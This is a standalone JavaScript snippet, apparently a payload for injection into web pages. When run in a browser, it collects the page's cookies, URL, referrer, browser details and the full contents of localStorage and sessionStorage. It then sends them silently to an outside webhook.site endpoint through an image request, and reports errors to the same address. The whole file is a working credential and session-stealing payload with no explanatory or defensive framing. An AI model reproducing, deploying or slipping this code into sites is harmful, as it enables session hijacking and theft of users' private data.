(function () {
  try {
    const data = {
      cookies: document.cookie || "[No Cookies]",
      location: window.location.href,
      referrer: document.referrer || "[No Referrer]",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      time: new Date().toISOString(),
      localStorage: {},
      sessionStorage: {}
    };

    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      data.localStorage[key] = localStorage.getItem(key);
    }

    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      data.sessionStorage[key] = sessionStorage.getItem(key);
    }

    const encoded = encodeURIComponent(JSON.stringify(data));
    new Image().src = "https://webhook.site/4b213de0-f8d2-46fc-bc4b-024c492d632f?data=" + encoded;

  } catch (err) {
    new Image().src = "https://webhook.site/4b213de0-f8d2-46fc-bc4b-024c492d632f?error=" + encodeURIComponent(err.toString());
  }
})();
